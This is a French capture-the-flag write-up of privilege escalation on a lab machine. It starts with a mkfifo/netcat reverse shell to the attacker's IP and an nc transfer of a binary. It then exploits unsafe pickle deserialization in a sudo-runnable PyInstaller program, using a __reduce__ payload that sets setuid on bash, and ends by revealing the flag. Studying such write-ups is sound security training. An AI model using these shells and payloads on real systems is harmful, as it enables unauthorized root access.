# CTF "Jormungandr" — Privilege Escalation vers root

**Cible :** 10.10.0.13
**Contexte de départ :** accès `jormungandr` obtenu via le service backdoor sur le port 7432 (voir doc `user.txt`)
**Objectif de cette phase :** `root.txt`

---

## 1. Stabilisation du shell

Avant de creuser le privesc, on obtient un vrai TTY interactif via un reverse shell (le pseudo-shell du port 7432 ne gère qu'une commande à la fois).

**Listener côté attaquant :**
```bash
nc -lvnp 4444
```

**Payload envoyé via le shell backdoor (port 7432) :**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.1.51 4444 >/tmp/f
```

→ Reverse shell interactif en tant que `jormungandr`.

## 2. Recherche de vecteurs de privesc

```bash
sudo -l
```

```
User jormungandr may run the following commands on midgard:
    (root) NOPASSWD: /opt/ragnarok/ragnarok
```

→ `jormungandr` peut exécuter `/opt/ragnarok/ragnarok` en root, sans mot de passe.

## 3. Identification du binaire

`file` et `xxd` non disponibles sur la cible → identification faite via `strings` :

```
strings /opt/ragnarok/ragnarok
```

Présence de `libpython3.5m.so.1.0` et d'une section `pydata` → signature caractéristique d'un exécutable **PyInstaller** (du code Python packagé en binaire autonome).

## 4. Récupération du binaire en local

Transfert via `nc` (pas de `scp` confirmé dispo) :

**Sur la machine attaquant :**
```bash
nc -lvnp 5555 > ragnarok
```

**Depuis le reverse shell sur la cible :**
```bash
cat /opt/ragnarok/ragnarok | nc 10.8.1.51 5555
```

Vérification de la taille en local une fois le transfert terminé.

## 5. Extraction et décompilation

```bash
pyinstxtractor-ng ragnarok
```

```
[+] Pyinstaller version: 2.1+
[+] Python version: 3.5
[+] Found 7 files in CArchive
[+] Possible entry point: ragnarok.pyc
[+] Found 136 files in PYZ archive
[+] Successfully extracted pyinstaller archive: ragnarok
```

→ dossier `ragnarok_extracted/` contenant `ragnarok.pyc` (le point d'entrée du programme).

```bash
cd ragnarok_extracted
uncompyle6 ragnarok.pyc
```

**Source décompilé :**
```python
# uncompyle6 version 3.9.3
# Python bytecode version base 3.5 (3350)
# Embedded file name: ragnarok.py
from sys import exit
import pickle, base64, binascii
print("This is the end of time! Choose your last meal before battle!\n")
entered = input("meal: ")
try:
    data = base64.b64decode(entered)
except (binascii.Error, EOFError):
    print("Error: the meal is 64 times worst than I thought")
    exit()

try:
    meal = pickle.loads(data)
except (pickle.UnpicklingError, KeyError, EOFError):
    print("Error: If this is your last meal, include at least a pickle in it!")
    exit()

print("Your meal is:", meal)
```

## 6. Vulnérabilité identifiée

Le programme fait un `pickle.loads()` sur une donnée **entièrement contrôlée par l'utilisateur** (base64 décodé, sans validation). `pickle.loads` sur des données non fiables permet l'exécution de code arbitraire : n'importe quelle classe définissant `__reduce__` peut faire exécuter une fonction avec des arguments arbitraires au moment de la désérialisation.

Comme ce binaire s'exécute en **root** via `sudo NOPASSWD`, on obtient l'exécution de code arbitraire en root.

## 7. Exploitation

**Génération du payload (en local) :**

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("chmod +s /bin/bash",))

payload = pickle.dumps(Exploit(), protocol=4)   # important : le binaire embarque Python 3.5,
                                                  # qui ne supporte que les protocoles pickle 0 à 4
print(base64.b64encode(payload).decode())
```

⚠️ **Piège rencontré :** générer le payload avec un Python récent (3.14) utilise par défaut le **protocole pickle 5**, non supporté par l'interpréteur 3.5 embarqué dans le binaire :
```
ValueError: unsupported pickle protocol: 5
```
→ Il faut forcer `protocol=4` explicitement dans `pickle.dumps()`.

**Exécution côté cible :**
```bash
sudo /opt/ragnarok/ragnarok
```
```
This is the end of time! Choose your last meal before battle!

meal: gASVLQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJjaG1vZCArcyAvYmluL2Jhc2iUhZRSlC4=
Your meal is: 0
```

Le `0` confirme le succès de `os.system(...)` (code de retour).

## 8. Shell root

```bash
/bin/bash -p
id
```
```
uid=1001(jormungandr) gid=1001(jormungandr) euid=0(root) egid=0(root) groups=0(root),1001(jormungandr)
```

Le flag `-p` est indispensable : il préserve les privilèges effectifs du bit setuid (sinon bash les abandonne au démarrage).

## 9. Récupération du flag

```bash
cd /root
ls -la
```
```
-rw-r--r-- 1 root root   44 Jul 23 13:42  root.txt
```

⚠️ Le nom de fichier contient un caractère invisible/espace en tête (`' root.txt'`), rendant `cat root.txt` inopérant. Contournement via un glob :

```bash
cat *root.txt*
```

**Flag : `EPI{d3N_hAr_GudarNa2_ErA_GaR_m0T_sITT_sluT}`**

---

## Résumé du chemin d'exploitation (privesc)

| Étape | Action | Résultat |
|---|---|---|
| 1 | Reverse shell (mkfifo + nc) | TTY interactif en `jormungandr` |
| 2 | `sudo -l` | `/opt/ragnarok/ragnarok` exécutable en root, NOPASSWD |
| 3 | `strings` sur le binaire | Signature PyInstaller (`libpython3.5m.so.1.0`, `pydata`) |
| 4 | Transfert via `nc` | Binaire récupéré en local |
| 5 | `pyinstxtractor-ng` + `uncompyle6` | Source Python révélée : `pickle.loads()` sur input utilisateur |
| 6 | Craft payload `__reduce__` → `os.system` | Payload pickle malveillant (protocol=4) |
| 7 | `sudo /opt/ragnarok/ragnarok` + payload | `chmod +s /bin/bash` exécuté en root |
| 8 | `/bin/bash -p` | Shell root |
| 9 | `cat *root.txt*` | `EPI{d3N_hAr_GudarNa2_ErA_GaR_m0T_sITT_sluT}` |